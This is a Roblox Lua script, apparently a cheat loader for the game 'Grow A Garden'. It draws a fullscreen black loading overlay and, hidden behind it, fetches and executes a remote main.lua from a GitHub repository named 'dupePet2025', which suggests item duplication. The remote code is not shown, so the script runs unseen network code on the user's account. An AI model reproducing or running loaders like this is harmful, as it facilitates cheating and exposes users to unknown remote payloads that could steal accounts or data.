loadstring([[
    -- Loading UI
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FullscreenLoadingUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = playerGui

    local background = Instance.new("Frame")
    background.Size = UDim2.new(1,0,1,0)
    background.Position = UDim2.new(0,0,0,0)
    background.BackgroundColor3 = Color3.fromRGB(0,0,0)
    background.BackgroundTransparency = 0
    background.Parent = screenGui

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0.6,0,0.1,0)
    titleLabel.Position = UDim2.new(0.2,0,0.03,0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextScaled = false
    titleLabel.TextSize = 48
    titleLabel.Text = "Grow A Garden"
    titleLabel.Parent = background

    local loadingNoticeLabel = Instance.new("TextLabel")
    loadingNoticeLabel.Size = UDim2.new(0.6,0,0.1,0)
    loadingNoticeLabel.Position = UDim2.new(0.2,0,0.12,0)
    loadingNoticeLabel.BackgroundTransparency = 1
    loadingNoticeLabel.TextColor3 = Color3.fromRGB(255,255,255)
    loadingNoticeLabel.Font = Enum.Font.SourceSansBold
    loadingNoticeLabel.TextScaled = false
    loadingNoticeLabel.TextSize = 40
    loadingNoticeLabel.Text = "Script loading Pls wait"
    loadingNoticeLabel.Parent = background

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0.7,0,0.15,0)
    loadingLabel.AnchorPoint = Vector2.new(0.5,0.5)
    loadingLabel.Position = UDim2.new(0.5,0,0.5,0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextColor3 = Color3.fromRGB(255,255,255)
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.TextScaled = false
    loadingLabel.TextSize = 56
    loadingLabel.Text = "Loading"
    loadingLabel.Parent = background

    -- Animate loading dots
    local running = true
    coroutine.wrap(function()
        while running do
            for i = 0, 3 do
                loadingLabel.Text = "Loading" .. string.rep(".", i)
                wait(0.5)
            end
        end
    end)()

    -- Load external script
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dupePet2025/GrowAGardenScript/refs/heads/main/main.lua"))()
    end)

    -- After external script loads or errors, remove loading UI
    running = false
    screenGui:Destroy()

    if not success then
        warn("Error loading external script:", err)
    end
]])()
